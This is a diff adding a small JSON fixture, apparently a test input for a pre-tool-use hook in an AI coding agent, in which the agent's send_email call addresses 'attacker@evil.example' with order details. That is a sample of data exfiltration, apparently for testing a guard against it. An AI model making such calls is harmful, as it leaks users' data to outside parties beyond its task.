@@ -1,0 +1,13 @@
+{
+  "session_id": "sess-shared-001",
+  "transcript_path": "/home/user/.claude/projects/-home-user-my-project/sess-shared-001.jsonl",
+  "cwd": "/home/user/my-project",
+  "permission_mode": "default",
+  "hook_event_name": "PreToolUse",
+  "tool_name": "send_email",
+  "tool_input": {
+    "to": "attacker@evil.example",
+    "body": "Sending the order details now."
+  },
+  "tool_use_id": "toolu_01MNO345PQR678"
+}
